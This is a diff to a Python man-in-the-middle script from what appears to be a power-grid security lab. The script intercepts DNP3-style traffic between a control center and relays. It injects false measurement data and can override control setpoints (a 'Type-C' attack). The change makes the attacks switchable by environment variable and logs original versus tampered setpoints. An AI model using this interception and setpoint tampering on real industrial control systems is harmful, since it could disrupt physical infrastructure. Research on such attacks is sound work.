@@ -1,8 +1,8 @@
 #!/usr/bin/env python3
 
-import errno
 import os
 import socket
+import time
 from socket import error as socket_error
 
 import util
@@ -11,16 +11,17 @@ MY_HOST = "10.0.0.20"
 RELAY_IPs = ["10.0.0.11", "10.0.0.12", "10.0.0.13", "10.0.0.14"]
 PORT = 20000
 
-# Measurement false-data injection (Project 3 / type A). Disable for baseline demos.
-FDIA_ON = True
+# PROJECT5_FDIA: 0/false disables measurement FDIA; default on for Project 3 compatibility
+_v_fdia = os.environ.get("PROJECT5_FDIA", "1")
+FDIA_ON = _v_fdia.lower() not in ("0", "false", "no", "")
 
-# Type-C: maliciously override control setpoint at the MitM (type C / HotSoS).
 TYPE_C_ATTACK = False
 MALICIOUS_SETPOINT = 8.0
 if os.environ.get("PROJECT5_TYPE_C", "").lower() in ("1", "true", "yes"):
     TYPE_C_ATTACK = True
 
-# Values from calculate_fdia.m: xa_est (indices 22..92) and za (indices 13..93)
+EXPERIMENT_MODE = os.environ.get("PROJECT5_MODE", "default")
+
 fdia_measure = {
     22: 0.19,
     32: 0.10,
@@ -42,7 +43,29 @@ fdia_measure = {
 }
 
 
+def _log_line(line):
+    print(line, flush=True)
+    _lf = os.environ.get("PROJECT5_LOG_FILE")
+    if _lf:
+        try:
+            with open(_lf, "a", encoding="utf-8") as fp:
+                fp.write(line + "\n")
+        except OSError:
+            pass
+
+
 def main():
+    _log_line(
+        "PROJECT5,CONFIG,mode=%s,fdia=%s,type_c=%s,tier1_env=%s,tier2_env=%s"
+        % (
+            EXPERIMENT_MODE,
+            FDIA_ON,
+            TYPE_C_ATTACK,
+            os.environ.get("PROJECT5_TIER1", "1"),
+            os.environ.get("PROJECT5_TIER2", "1"),
+        )
+    )
+
     s_to_relays = []
     for i in range(len(RELAY_IPs)):
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -113,6 +136,8 @@ def main():
 
                 elif op == util.REQ_CONTROL:
                     target_index, setpoint = util.unpack_dnp3m_control(data)
+                    orig_sp = float(setpoint)
+                    t0 = time.time()
                     if TYPE_C_ATTACK:
                         print(
                             "Type-C MitM: overriding command setpoint %.4f -> %.4f"
@@ -128,7 +153,29 @@ def main():
                     fwd = util.pack_dnp3m_control(target_index, setpoint)
                     cur_sock.sendall(fwd)
                     ack = cur_sock.recv(1024)
+                    dt_ms = (time.time() - t0) * 1000.0
+                    status = util.unpack_control_ack(ack)
                     conn.sendall(ack)
+                    line = (
+                        "PROJECT5,DA_CONTROL,mode=%s,idx=%d,orig_sp=%.6f,fwd_sp=%.6f,type_c=%s,ack_status=%d,latency_ms=%.3f"
+                        % (
+                            EXPERIMENT_MODE,
+                            target_index,
+                            orig_sp,
+                            float(setpoint),
+                            TYPE_C_ATTACK,
+                            status,
+                            dt_ms,
+                        )
+                    )
+                    print(line, flush=True)
+                    _lf = os.environ.get("PROJECT5_LOG_FILE")
+                    if _lf:
+                        try:
+                            with open(_lf, "a", encoding="utf-8") as fp:
+                                fp.write(line + "\n")
+                        except OSError:
+                            pass
                 else:
                     print("Unknown opcode from control center:", op)
                     break
